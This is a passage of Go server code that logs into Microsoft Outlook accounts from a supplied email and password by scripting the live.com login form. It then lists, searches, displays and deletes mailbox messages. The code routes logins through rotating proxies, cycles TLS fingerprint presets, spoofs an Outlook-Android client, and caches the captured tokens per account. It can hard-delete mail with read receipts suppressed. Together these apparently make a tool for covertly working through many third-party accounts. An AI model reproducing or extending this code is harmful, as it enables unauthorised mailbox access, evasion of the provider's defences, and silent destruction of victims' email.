	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		stdhttp.Error(w, err.Error(), 400)
		return
	}
	if req.Size <= 0 || req.Size > 200 {
		req.Size = 100
	}
	if req.From < 0 {
		req.From = 0
	}
	q := strings.TrimSpace(req.Query)
	if q == "" {
		q = "*"
	}
	var tryPx []string
	if strings.EqualFold(req.ProxyMode, "server") && len(req.ProxyURLs) > 0 {
		if px, err := fetchProxiesFromURLs(req.ProxyURLs); err == nil {
			tryPx = px
		}
	} else if p := strings.TrimSpace(req.Proxy); p != "" {
		if px, err := loadProxies(p); err == nil && len(px) > 0 {
			tryPx = px
		} else {
			tryPx = []string{p}
		}
	}
	if len(tryPx) == 0 {
		tryPx = []string{""}
	}
	if len(tryPx) > 5 {
		tryPx = tryPx[:5]
	}
	email := strings.TrimSpace(req.Email)
	var msgs []mailMsg
	var err error
	if sess, ok := cachedMailSess(email); ok {
		msgs, alive, total := queryOutlookWithTokenOK(sess.Token, sess.CID, email, req.From, req.Size, q, req.Folder)
		if alive {
			more := (total > 0 && req.From+len(msgs) < total) || (total == 0 && len(msgs) >= 10)
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "email": req.Email, "messages": msgs, "count": len(msgs), "total": total, "from": req.From, "size": req.Size, "more": more, "reused": true})
			return
		}
		dropMailSess(email)
	}
	for _, p := range tryPx {
		msgs, err = listOutlookMailOnce(email, req.Password, p, req.From, req.Size, q, req.Folder)
		if err == nil {
			break
		}
	}
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(400)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
		return
	}
	w.Header().Set("Content-Type", "application/json")
	mailSessMu.Lock()
	total := mailLastTotal
	mailSessMu.Unlock()
	more := (total > 0 && req.From+len(msgs) < total) || (total == 0 && len(msgs) >= 10)
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "email": req.Email, "messages": msgs, "count": len(msgs), "total": total, "from": req.From, "size": req.Size, "more": more})
}

func countMailTotal(v interface{}) int {
	switch val := v.(type) {
	case map[string]interface{}:
		for _, key := range []string{"Total", "ResultCount", "total", "EstimatedTotal", "TotalResults"} {
			if t, ok := val[key]; ok {
				switch n := t.(type) {
				case float64:
					if int(n) > 0 {
						return int(n)
					}
				case int:
					if n > 0 {
						return n
					}
				}
			}
		}
		best := 0
		for _, child := range val {
			if n := countMailTotal(child); n > best {
				best = n
			}
		}
		return best
	case []interface{}:
		best := 0
		for _, child := range val {
			if n := countMailTotal(child); n > best {
				best = n
			}
		}
		return best
	}
	return 0
}

func outlookFolderName(folder string) string {
	switch strings.ToLower(strings.TrimSpace(folder)) {
	case "sent", "sentitems":
		return "SentItems"
	case "spam", "junk", "junkemail":
		return "JunkEmail"
	case "deleted", "deleteditems", "trash":
		return "DeletedItems"
	default:
		return "Inbox"
	}
}

func queryOutlookWithToken(token, cid, mailbox string, from, size int, query string) []mailMsg {
	msgs, _, _ := queryOutlookWithTokenOK(token, cid, mailbox, from, size, query, "inbox")
	return msgs
}

func listOutlookFolderREST(token, cid, mailbox, folder string, from, size int) ([]mailMsg, bool, int) {
	if size <= 0 {
		size = 80
	}
	if from < 0 {
		from = 0
	}
	name := outlookFolderName(folder)
	cli := newTLSClient("", 25*time.Second, true)
	if cli == nil {
		return nil, false, 0
	}
	anchor := ""
	if mailbox != "" {
		anchor = "SMTP:" + mailbox
	} else if cid != "" {
		anchor = "CID:" + cid
	}
	path := fmt.Sprintf("/api/v2.0/me/MailFolders/%s/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,Subject,From,ReceivedDateTime,BodyPreview,ChangeKey", url.PathEscape(name), size, from)
	var msgs []mailMsg
	alive := false
	total := 0
	for _, host := range []string{"https://outlook.live.com", "https://outlook.office.com"} {
		req, _ := http.NewRequest("GET", host+path, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("User-Agent", "Outlook-Android/2.0")
		req.Header.Set("Accept", "application/json")
		if anchor != "" {
			req.Header.Set("X-AnchorMailbox", anchor)
		}
		resp, err := doReq(cli, req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 {
			continue
		}
		alive = true
		var wrap struct {
			Value []struct {
				ID               string `json:"Id"`
				Subject          string `json:"Subject"`
				ChangeKey        string `json:"ChangeKey"`
				ReceivedDateTime string `json:"ReceivedDateTime"`
				BodyPreview      string `json:"BodyPreview"`
				From             struct {
					EmailAddress struct {
						Name    string `json:"Name"`
						Address string `json:"Address"`
					} `json:"EmailAddress"`
				} `json:"From"`
			} `json:"value"`
			Count int `json:"@odata.count"`
		}
		if json.Unmarshal(b, &wrap) != nil {
			continue
		}
		for _, it := range wrap.Value {
			fromS := it.From.EmailAddress.Address
			if it.From.EmailAddress.Name != "" && fromS != "" {
				fromS = it.From.EmailAddress.Name + " <" + fromS + ">"
			} else if fromS == "" {
				fromS = it.From.EmailAddress.Name
			}
			msgs = append(msgs, mailMsg{
				ID:        it.ID,
				ChangeKey: it.ChangeKey,
				Subject:   it.Subject,
				From:      fromS,
				Date:      it.ReceivedDateTime,
				Preview:   it.BodyPreview,
			})
		}
		if wrap.Count > 0 {
			total = wrap.Count
		}
		if len(msgs) > 0 || resp.StatusCode == 200 {
			break
		}
	}
	if total == 0 {
		total = from + len(msgs)
		if len(msgs) == size {
			total += size
		}
	}
	return msgs, alive, total
}

func queryOutlookWithTokenOK(token, cid, mailbox string, from, size int, query, folder string) ([]mailMsg, bool, int) {
	if rest, alive, total := listOutlookFolderREST(token, cid, mailbox, folder, from, size); alive && (len(rest) > 0 || folder != "") {
		q := strings.TrimSpace(strings.ToLower(query))
		if q != "" && q != "*" && q != "kind:email" && !strings.HasPrefix(q, "kind:") {
			filtered := rest[:0]
			for _, m := range rest {
				blob := strings.ToLower(m.Subject + " " + m.From + " " + m.Preview)
				if strings.Contains(blob, strings.TrimSpace(strings.ToLower(query))) {
					filtered = append(filtered, m)
				}
			}
			return filtered, true, total
		}
		return rest, true, total
	}
	if query == "" {
		query = "*"
	}
	if size <= 0 {
		size = 80
	}
	qJSON, _ := json.Marshal(query)
	searchBody := fmt.Sprintf(`{"Cvid":"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7","Scenario":{"Name":"owa.react"},"TimeZone":"UTC","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{"Term":{"DistinguishedFolderName":%q}},"From":%d,"Query":{"QueryString":%s},"Size":%d,"Sort":[{"Field":"Time","SortDirection":"Desc"}],"EnableTopResults":false}],"LogicalId":"446c567a-02d9-b739-b9ca-616e0d45905c"}`, outlookFolderName(folder), from, string(qJSON), size)
	cli := newTLSClient("", 25*time.Second, true)
	if cli == nil {
		return nil, false, 0
	}
	var msgs []mailMsg
	alive := false
	total := 0
	for _, ep := range []string{"https://substrate.office.com/search/api/v2/query", "https://outlook.live.com/search/api/v2/query"} {
		reqS, _ := http.NewRequest("POST", ep, strings.NewReader(searchBody))
		reqS.Header.Set("User-Agent", "Outlook-Android/2.0")
		reqS.Header.Set("Accept", "application/json")
		reqS.Header.Set("Authorization", "Bearer "+token)
		reqS.Header.Set("Content-Type", "application/json")
		if mailbox != "" {
			reqS.Header.Set("X-AnchorMailbox", "SMTP:"+mailbox)
		} else if cid != "" {
			reqS.Header.Set("X-AnchorMailbox", "CID:"+cid)
		}
		respS, err := doReq(cli, reqS)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(respS.Body)
		respS.Body.Close()
		if respS.StatusCode != 200 {
			continue
		}
		alive = true
		var raw interface{}
		if json.Unmarshal(b, &raw) != nil {
			continue
		}
		if n := countMailTotal(raw); n > total {
			total = n
		}
		collectMailMsgs(raw, &msgs)
		if len(msgs) > 0 {
			break
		}
	}
	return msgs, alive, total
}

func deleteOutlookMessage(token, cid, mailbox, itemID, changeKey string, purge bool) error {
	itemID = strings.TrimSpace(itemID)
	if token == "" || itemID == "" {
		return fmt.Errorf("missing token or message id")
	}
	cli := newTLSClient("", 25*time.Second, true)
	if cli == nil {
		return fmt.Errorf("could not create client")
	}
	anchor := ""
	if mailbox != "" {
		anchor = "SMTP:" + mailbox
	} else if cid != "" {
		anchor = "CID:" + cid
	}
	encID := url.PathEscape(itemID)
	// Try Outlook REST / Graph-style delete first (moves or hard-deletes the item).
	for _, u := range []string{
		"https://outlook.live.com/api/v2.0/me/messages/" + encID,
		"https://outlook.office.com/api/v2.0/me/messages/" + encID,
		"https://graph.microsoft.com/v1.0/me/messages/" + encID,
	} {
		req, _ := http.NewRequest("DELETE", u, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("User-Agent", "Outlook-Android/2.0")
		req.Header.Set("Accept", "application/json")
		if anchor != "" {
			req.Header.Set("X-AnchorMailbox", anchor)
		}
		resp, err := doReq(cli, req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 204 || resp.StatusCode == 200 || resp.StatusCode == 202 {
			return nil
		}
		_ = b
	}
	// OWA DeleteItem — MoveToDeletedItems (same as the Outlook trash button).
	type itemRef struct {
		Type      string `json:"__type"`
		ID        string `json:"Id"`
		ChangeKey string `json:"ChangeKey,omitempty"`
	}
	ref := itemRef{Type: "ItemId:#Exchange", ID: itemID}
	if changeKey != "" {
		ref.ChangeKey = changeKey
	}
	payload := map[string]any{
		"__type": "DeleteItemJsonRequest:#Exchange",
		"Header": map[string]any{
			"__type":               "JsonRequestHeaders:#Exchange",
			"RequestServerVersion": "V2018_01_08",
		},
		"Body": map[string]any{
			"__type":              "DeleteItemRequest:#Exchange",
			"ItemIds":             []itemRef{ref},
			"DeleteType":          map[bool]string{true: "HardDelete", false: "MoveToDeletedItems"}[purge],
			"SuppressReadReceipts": true,
		},
	}
	raw, _ := json.Marshal(payload)
	for _, u := range []string{
		"https://outlook.live.com/owa/0/service.svc?action=DeleteItem&app=Mail",
		"https://outlook.office.com/owa/0/service.svc?action=DeleteItem&app=Mail",
		"https://substrate.office.com/owa/service.svc?action=DeleteItem",
	} {
		req, _ := http.NewRequest("POST", u, bytes.NewReader(raw))
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("User-Agent", "Outlook-Android/2.0")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Action", "DeleteItem")
		req.Header.Set("X-OWA-UrlPostData", string(raw))
		if anchor != "" {
			req.Header.Set("X-AnchorMailbox", anchor)
		}
		resp, err := doReq(cli, req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 200 || resp.StatusCode == 204 {
			low := strings.ToLower(string(b))
			if strings.Contains(low, "error") && strings.Contains(low, "responsecode") && !strings.Contains(low, `"nOerror"`) && !strings.Contains(low, "noerror") {
				continue
			}
			return nil
		}
	}
	return fmt.Errorf("outlook would not delete that message")
}

func extractAnyHTML(v interface{}) string {
	switch t := v.(type) {
	case string:
		if strings.Contains(t, "<") && (strings.Contains(strings.ToLower(t), "<html") || strings.Contains(strings.ToLower(t), "<div") || strings.Contains(strings.ToLower(t), "<table") || strings.Contains(strings.ToLower(t), "<p") || strings.Contains(strings.ToLower(t), "<br")) {
			return t
		}
	case map[string]interface{}:
		for _, k := range []string{"UniqueBody", "Body", "HtmlBody", "Value", "Content", "BodyHtml", "SanitizedHtml"} {
			if s := extractAnyHTML(t[k]); s != "" {
				return s
			}
		}
		for _, child := range t {
			if s := extractAnyHTML(child); s != "" {
				return s
			}
		}
	case []interface{}:
		for _, child := range t {
			if s := extractAnyHTML(child); s != "" {
				return s
			}
		}
	}
	return ""
}

func fetchOutlookItemHTML(token, cid, mailbox, itemID string) string {
	itemID = strings.TrimSpace(itemID)
	if token == "" || itemID == "" {
		return ""
	}
	cli := newTLSClient("", 25*time.Second, true)
	if cli == nil {
		return ""
	}
	anchor := ""
	if mailbox != "" {
		anchor = "SMTP:" + mailbox
	} else if cid != "" {
		anchor = "CID:" + cid
	}
	enc := url.PathEscape(itemID)
	getURLs := []string{
		"https://outlook.live.com/api/v2.0/me/messages/" + enc + "?$select=Subject,Body,UniqueBody,From,ReceivedDateTime&$expand=Attachments",
		"https://outlook.office.com/api/v2.0/me/messages/" + enc + "?$select=Subject,Body,UniqueBody,From,ReceivedDateTime&$expand=Attachments",
		"https://graph.microsoft.com/v1.0/me/messages/" + enc + "?$select=subject,body,uniqueBody,from,receivedDateTime&$expand=attachments",
	}
	for _, u := range getURLs {
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("User-Agent", "Outlook-Android/2.0")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Prefer", `outlook.body-content-type="html"`)
		if anchor != "" {
			req.Header.Set("X-AnchorMailbox", anchor)
		}
		resp, err := doReq(cli, req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 {
			continue
		}
		var raw interface{}
		if json.Unmarshal(b, &raw) != nil {
			continue
		}
		if html := extractAnyHTML(raw); html != "" {
			return inlineMailCIDs(html, raw)
		}
	}
	payload := map[string]any{
		"__type": "GetItemJsonRequest:#Exchange",
		"Header": map[string]any{
			"__type":               "JsonRequestHeaders:#Exchange",
			"RequestServerVersion": "V2018_01_08",
		},
		"Body": map[string]any{
			"__type": "GetItemRequest:#Exchange",
			"ItemShape": map[string]any{
				"__type":           "ItemResponseShape:#Exchange",
				"BaseShape":        "AllProperties",
				"BodyType":         "HTML",
				"WantHtmlBody":     true,
				"AdditionalProperties": []map[string]any{
					{"__type": "ExtendedPropertyUri:#Exchange", "PropertyType": "String", "PropertyName": "HtmlBody"},
				},
			},
			"ItemIds": []map[string]string{{
				"__type": "ItemId:#Exchange",
				"Id":     itemID,
			}},
		},
	}
	rawJSON, _ := json.Marshal(payload)
	for _, u := range []string{
		"https://outlook.live.com/owa/0/service.svc?action=GetItem&app=Mail",
		"https://outlook.office.com/owa/0/service.svc?action=GetItem&app=Mail",
		"https://substrate.office.com/owa/service.svc?action=GetItem",
	} {
		req, _ := http.NewRequest("POST", u, bytes.NewReader(rawJSON))
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("User-Agent", "Outlook-Android/2.0")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Action", "GetItem")
		req.Header.Set("X-OWA-UrlPostData", string(rawJSON))
		if anchor != "" {
			req.Header.Set("X-AnchorMailbox", anchor)
		}
		resp, err := doReq(cli, req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 {
			continue
		}
		var raw interface{}
		if json.Unmarshal(b, &raw) != nil {
			continue
		}
		if html := extractAnyHTML(raw); html != "" {
			return inlineMailCIDs(html, raw)
		}
	}
	return ""
}

func inlineMailCIDs(html string, raw interface{}) string {
	if html == "" {
		return html
	}
	var walk func(interface{})
	walk = func(v interface{}) {
		switch t := v.(type) {
		case map[string]interface{}:
			cid, _ := t["ContentId"].(string)
			if cid == "" {
				cid, _ = t["contentId"].(string)
			}
			ctype, _ := t["ContentType"].(string)
			if ctype == "" {
				ctype, _ = t["contentType"].(string)
			}
			b64, _ := t["ContentBytes"].(string)
			if b64 == "" {
				b64, _ = t["contentBytes"].(string)
			}
			if cid != "" && b64 != "" {
				if ctype == "" {
					ctype = "application/octet-stream"
				}
				repl := "data:" + ctype + ";base64," + b64
				html = strings.ReplaceAll(html, "cid:"+cid, repl)
				html = strings.ReplaceAll(html, "CID:"+cid, repl)
				html = strings.ReplaceAll(html, "cid:"+strings.Trim(cid, "<>"), repl)
			}
			for _, c := range t {
				walk(c)
			}
		case []interface{}:
			for _, c := range t {
				walk(c)
			}
		}
	}
	walk(raw)
	return html
}

func handleMailBody(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "application/json")
	if r.Method != stdhttp.MethodPost {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "POST only"})
		return
	}
	var req struct {
		Email string `json:"email"`
		ID    string `json:"id"`
	}
	if json.NewDecoder(r.Body).Decode(&req) != nil || strings.TrimSpace(req.Email) == "" {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "email required"})
		return
	}
	sess, ok := cachedMailSess(req.Email)
	if !ok || sess.Token == "" {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "no mail session"})
		return
	}
	html := fetchOutlookItemHTML(sess.Token, sess.CID, req.Email, req.ID)
	if html == "" {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "no html body"})
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "html": html})
}

func handleMailView(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	email := strings.TrimSpace(r.URL.Query().Get("email"))
	id := strings.TrimSpace(r.URL.Query().Get("id"))
	if email == "" || id == "" {
		stdhttp.Error(w, "email and id required", 400)
		return
	}
	sess, ok := cachedMailSess(email)
	if !ok || sess.Token == "" {
		stdhttp.Error(w, "no mail session", 401)
		return
	}
	html := fetchOutlookItemHTML(sess.Token, sess.CID, email, id)
	if html == "" {
		html = "<html><body style='font:15px Segoe UI;padding:16px;color:#444'>Could not load this message body.</body></html>"
	}
	if !strings.Contains(strings.ToLower(html), "<html") {
		html = "<!DOCTYPE html><html><head><meta charset='utf-8'><base target='_blank'><style>html,body{margin:0;padding:16px;background:#fff;color:#111;font:15px/1.55 Segoe UI,Arial,sans-serif}img,video,iframe{max-width:100%;height:auto}table{max-width:100%}</style></head><body>" + html + "</body></html>"
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write([]byte(html))
}

func handleMailDelete(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "application/json")
	if r.Method != stdhttp.MethodPost {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "POST only"})
		return
	}
	var req struct {
		Email     string   `json:"email"`
		ID        string   `json:"id"`
		IDs       []string `json:"ids"`
		ChangeKey string   `json:"change_key"`
		Purge     bool     `json:"purge"`
	}
	if json.NewDecoder(r.Body).Decode(&req) != nil || strings.TrimSpace(req.Email) == "" {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "email required"})
		return
	}
	ids := req.IDs
	if strings.TrimSpace(req.ID) != "" {
		ids = append(ids, req.ID)
	}
	if len(ids) == 0 {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "message id required"})
		return
	}
	sess, ok := cachedMailSess(req.Email)
	if !ok || sess.Token == "" {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "no mail session — open the mailbox first"})
		return
	}
	var last error
	okN := 0
	for _, id := range ids {
		id = strings.TrimSpace(id)
		if id == "" {
			continue
		}
		if err := deleteOutlookMessage(sess.Token, sess.CID, req.Email, id, req.ChangeKey, req.Purge); err != nil {
			last = err
			continue
		}
		okN++
	}
	if okN == 0 {
		errS := "could not delete"
		if last != nil {
			errS = last.Error()
		}
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": errS})
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "deleted": okN})
}

func listOutlookMail(email, password, proxyStr string, from, size int, query string) ([]mailMsg, error) {
	proxies := []string{""}
	if strings.TrimSpace(proxyStr) != "" {
		if px, err := loadProxies(proxyStr); err == nil && len(px) > 0 {
			proxies = px
		} else {
			proxies = []string{proxyStr}
		}
	}
	if len(proxies) > 5 {
		proxies = proxies[:5]
	}
	var last error
	for _, p := range proxies {
		msgs, err := listOutlookMailOnce(email, password, p, from, size, query, "inbox")
		if err == nil {
			return msgs, nil
		}
		last = err
	}
	if last == nil {
		last = fmt.Errorf("couldn't create client / bad proxies")
	} else {
		last = fmt.Errorf("couldn't create client / bad proxies: %v", last)
	}
	return nil, last
}

func listOutlookMailOnce(email, password, proxyStr string, from, size int, query, folder string) ([]mailMsg, error) {
	preset := nextTLSPreset()
	client, noRedir := newTLSClientPairProfile(proxyStr, 30*time.Second, 25*time.Second, preset.profile)
	if client == nil || noRedir == nil {
		return nil, fmt.Errorf("could not create client")
	}
	jar := client.GetCookieJar()
	ua := preset.ua
	authStart := "https://login.live.com/oauth20_authorize.srf?" + url.Values{
		"client_id":     {OutlookClientID},
		"response_type": {"token"},
		"scope":         {"service::outlook.office.com::MBI_SSL"},
		"redirect_uri":  {OutlookRedirect},
		"display":       {"touch"},
	}.Encode()
	req, err := http.NewRequest("GET", authStart, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", ua)
	resp, err := doReq(client, req)
	if err != nil {
		return nil, err
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	page := string(body)
	ppft := extractPPFT(page)
	if ppft == "" {
		return nil, fmt.Errorf("login page failed")
	}
	postURL := "https://login.live.com/ppsecure/post.srf?client_id=" + OutlookClientID +
		"&redirect_uri=" + url.QueryEscape(OutlookRedirect) +
		"&response_type=token&scope=" + url.QueryEscape("service::outlook.office.com::MBI_SSL") +
		"&display=touch"
	if uaid := cookieVal(jar, "uaid"); uaid != "" {
		postURL += "&uaid=" + uaid
	}
	form := url.Values{}
	form.Set("ps", "2")
	form.Set("PPFT", ppft)
	form.Set("PPSX", "Pa")
	form.Set("NewUser", "1")
	form.Set("IsFidoSupported", "1")
	form.Set("i13", "1")
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("type", "11")
	form.Set("LoginOptions", "1")
	form.Set("passwd", password)
	req2, _ := http.NewRequest("POST", postURL, strings.NewReader(form.Encode()))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("Origin", "https://login.live.com")
	req2.Header.Set("User-Agent", ua)
	req2.Header.Set("Referer", authStart)
	resp2, err := doReq(noRedir, req2)
	if err != nil {
		resp2, err = doReq(client, req2)
	}
	if err != nil {
		return nil, err
	}
	body2, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()
	combined := resp2.Header.Get("Location") + "\n" + string(body2)
	req3, _ := http.NewRequest("GET", authStart+"&prompt=none", nil)
	req3.Header.Set("User-Agent", ua)
	if resp3, err := doReq(noRedir, req3); err == nil {
		body3, _ := io.ReadAll(resp3.Body)
		resp3.Body.Close()
		combined += "\n" + resp3.Header.Get("Location") + "\n" + string(body3)
	}
	atk := extractParameter(combined, "access_token=")
	rtk := extractParameter(combined, "refresh_token=")
	if decoded, err := url.QueryUnescape(atk); err == nil && decoded != "" {
		atk = decoded
	}
	if decoded, err := url.QueryUnescape(rtk); err == nil && decoded != "" {
		rtk = decoded
	}
	token := atk
	if rtk != "" {
		exForm := url.Values{}
		exForm.Set("grant_type", "refresh_token")
		exForm.Set("client_id", OutlookClientID)
		exForm.Set("scope", OutlookScope)
		exForm.Set("redirect_uri", OutlookRedirect)
		exForm.Set("refresh_token", rtk)
		req4, _ := http.NewRequest("POST", OutlookTokenURL, strings.NewReader(exForm.Encode()))
		req4.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req4.Header.Set("User-Agent", "Outlook-Android/2.0")
		req4.Header.Set("x-ms-sso-Ignore-SSO", "1")
		if resp4, err := doReq(client, req4); err == nil {
			b4, _ := io.ReadAll(resp4.Body)
			resp4.Body.Close()
			var tj map[string]interface{}
			if json.Unmarshal(b4, &tj) == nil {
				if a, ok := tj["access_token"].(string); ok && a != "" {
					token = a
				}
			}
		}
	}
	if token == "" {
		low := strings.ToLower(combined)
		switch {
		case strings.Contains(low, "password is incorrect"), strings.Contains(low, "account doesn't exist"):
			return nil, fmt.Errorf("login failed: wrong password")
		case strings.Contains(low, "identity/confirm"), strings.Contains(low, "proofs"):
			return nil, fmt.Errorf("login needs extra verification")
		case strings.Contains(low, "account.live.com/ar/cancel"):
			return nil, fmt.Errorf("login blocked / interrupted")
		default:
			return nil, fmt.Errorf("could not get mailbox token (no access_token in redirect)")
		}
	}
	cid := ""
	for _, c := range jar.Cookies(mustParseURL("https://login.live.com")) {
		if c.Name == "MSPCID" {
			cid = strings.ToUpper(c.Value)
			break
		}
	}
	rememberMailSess(email, token, cid)
	if rest, alive, _ := listOutlookFolderREST(token, cid, email, folder, from, size); alive {
		return rest, nil
	}
	if query == "*" || query == "" {
		query = "kind:email"
	}
	qJSON, _ := json.Marshal(query)
	searchBody := fmt.Sprintf(`{"Cvid":"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7","Scenario":{"Name":"owa.react"},"TimeZone":"UTC","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{"Term":{"DistinguishedFolderName":%q}},"From":%d,"Query":{"QueryString":%s},"Size":%d,"Sort":[{"Field":"Time","SortDirection":"Desc"}],"EnableTopResults":false}],"LogicalId":"446c567a-02d9-b739-b9ca-616e0d45905c"}`, outlookFolderName(folder), from, string(qJSON), size)
	endpoints := []string{
		"https://substrate.office.com/search/api/v2/query",
		"https://outlook.live.com/search/api/v2/query",
	}
	var msgs []mailMsg
	for _, ep := range endpoints {
		reqS, _ := http.NewRequest("POST", ep, strings.NewReader(searchBody))
		reqS.Header.Set("User-Agent", "Outlook-Android/2.0")
		reqS.Header.Set("Accept", "application/json")
		reqS.Header.Set("Authorization", "Bearer "+token)
		reqS.Header.Set("Content-Type", "application/json")
		if email != "" {
			reqS.Header.Set("X-AnchorMailbox", "SMTP:"+email)
		} else if cid != "" {
			reqS.Header.Set("X-AnchorMailbox", "CID:"+cid)
		}
		respS, err := doReq(client, reqS)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(respS.Body)
		respS.Body.Close()
		if respS.StatusCode != 200 {
			continue
		}
		var raw interface{}
		if json.Unmarshal(b, &raw) != nil {
			continue
		}
		if n := countMailTotal(raw); n > 0 {
			mailSessMu.Lock()
			mailLastTotal = n
			mailSessMu.Unlock()
		}
		collectMailMsgs(raw, &msgs)
		if len(msgs) > 0 {
			break
		}
	}
	return msgs, nil
}

func firstMailFrom(val map[string]interface{}) string {
	for _, key := range []string{"From", "Sender", "DisplayFrom", "SenderDisplayName", "FromDisplayName"} {
		switch t := val[key].(type) {
		case string:
			if t != "" {
				return t
			}
		case map[string]interface{}:
			if a, ok := t["EmailAddress"].(string); ok && a != "" {
				return a
			}
			if em, ok := t["EmailAddress"].(map[string]interface{}); ok {
				if a, ok := em["Address"].(string); ok && a != "" {
					return a
				}
				if n, ok := em["Name"].(string); ok && n != "" {
					return n
				}
			}
			if n, ok := t["Name"].(string); ok && n != "" {
				return n
			}
			if a, ok := t["Address"].(string); ok && a != "" {
				return a
			}
		}
	}
	return ""
}

func mailHTMLValue(v interface{}) string {
	switch t := v.(type) {
	case string:
		if strings.Contains(t, "<") {
			return t
		}
	case map[string]interface{}:
		if c, ok := t["Value"].(string); ok && c != "" {
			return c
		}
		if c, ok := t["Content"].(string); ok && c != "" {
			return c
		}
		if c, ok := t["Body"].(string); ok && c != "" {
			return c
		}
	}
	return ""
}

func extractMailImages(html string) []string {
	if html == "" {
		return nil
	}
	re := regexp.MustCompile(`(?i)<img[^>]+src=["'](https?://[^"']+)["']`)
	seen := map[string]bool{}
	var out []string
	for _, m := range re.FindAllStringSubmatch(html, 20) {
		u := m[1]
		if seen[u] {
			continue
		}
		seen[u] = true
		out = append(out, u)
	}
	return out
}

func stripMailHTML(html string) string {
	re := regexp.MustCompile(`(?s)<style[^>]*>.*?</style>|<script[^>]*>.*?</script>|<[^>]+>`)
	s := re.ReplaceAllString(html, " ")
	s = strings.Join(strings.Fields(s), " ")
	if len(s) > 800 {
		s = s[:800]
	}
	return s
}

func collectMailMsgs(v interface{}, out *[]mailMsg) {
	switch val := v.(type) {
	case map[string]interface{}:
		subj, _ := val["Subject"].(string)
		if subj == "" {
			subj, _ = val["subject"].(string)
		}
		if subj == "" {
			subj, _ = val["ConversationTopic"].(string)
		}
		if subj != "" {
			m := mailMsg{Subject: subj}
			pickID := func(obj map[string]interface{}) {
				if m.ID == "" {
					for _, k := range []string{"Id", "id", "ItemId", "ConversationId"} {
						if id, ok := obj[k].(string); ok && id != "" && !strings.HasPrefix(id, "<") {
							m.ID = id
							break
						}
					}
					if iid, ok := obj["ItemId"].(map[string]interface{}); ok {
						if id, ok := iid["Id"].(string); ok && id != "" {
							m.ID = id
						}
						if ck, ok := iid["ChangeKey"].(string); ok {
							m.ChangeKey = ck
						}
					}
				}
				if m.ChangeKey == "" {
					if ck, ok := obj["ChangeKey"].(string); ok {
						m.ChangeKey = ck
					}
				}
			}
			pickID(val)
			if src, ok := val["Source"].(map[string]interface{}); ok {
				pickID(src)
			}
			for _, k := range []string{"Preview", "preview", "BodyPreview", "HighlightedSummary"} {
				if p, ok := val[k].(string); ok && p != "" && (m.Preview == "" || len(p) > len(m.Preview)) {
					m.Preview = p
				}
			}
			for _, k := range []string{"UniqueBody", "Body", "HtmlBody"} {
				html := mailHTMLValue(val[k])
				if html != "" {
					if m.HTML == "" || len(html) > len(m.HTML) {
						m.HTML = html
					}
				}
			}
			if src, ok := val["Source"].(map[string]interface{}); ok {
				for _, k := range []string{"UniqueBody", "Body", "Preview", "preview"} {
					if html := mailHTMLValue(src[k]); html != "" && (m.HTML == "" || len(html) > len(m.HTML)) {
						m.HTML = html
					}
					if p, ok := src[k].(string); ok && p != "" && !strings.Contains(p, "<") && (m.Preview == "" || len(p) > len(m.Preview)) {
						m.Preview = p
					}
				}
			}
			m.Images = extractMailImages(m.HTML)
